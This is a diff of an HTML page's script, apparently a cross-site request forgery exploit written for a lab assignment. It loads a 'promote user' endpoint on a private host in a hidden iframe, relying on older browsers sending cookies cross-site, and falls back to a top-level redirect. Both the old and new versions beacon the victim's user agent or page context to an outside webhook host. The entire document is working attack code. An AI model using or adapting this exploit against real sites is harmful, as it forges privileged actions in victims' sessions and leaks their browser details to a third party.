@@ -4,19 +4,13 @@
 <body>
 <script>
 var W = 'https://golden-sparrow-81.webhook.cool';
-var ctx = {href: location.href, framed: (window.top !== window), ref: document.referrer, ua: navigator.userAgent};
-var qs = '?ctx=' + encodeURIComponent(JSON.stringify(ctx));
-try { new Image().src = W + '/beacon-img' + qs; } catch(e) {}
-try { fetch(W + '/beacon-fetch' + qs).catch(function(){}); } catch(e) {}
-
 var TARGET = 'https://10.20.18.55:2070/labs/assignment03/environment/1/api/users/20211381/promote';
-if (window.top !== window) {
-  // loaded in a frame: break out via a top-level navigation
-  try { top.location = TARGET; }
-  catch(e) { try { new Image().src = W + '/topfail?e=' + encodeURIComponent(String(e)); } catch(x) {} }
-} else {
-  location.replace(TARGET);
-}
+var qs = '?v3=1&ua=' + encodeURIComponent(navigator.userAgent);
+try { new Image().src = W + '/v3-loaded' + qs; } catch(e) {}
+// Chrome <50 ignores SameSite -> cookies attach even to cross-site iframes
+try { document.write('<iframe src="' + TARGET + '" style="width:10px;height:10px;border:0"></iframe>'); } catch(e) {}
+// top-level navigation fallback after the iframe has had its chance
+setTimeout(function(){ location.replace(TARGET); }, 1500);
 </script>
 </body>
 </html>
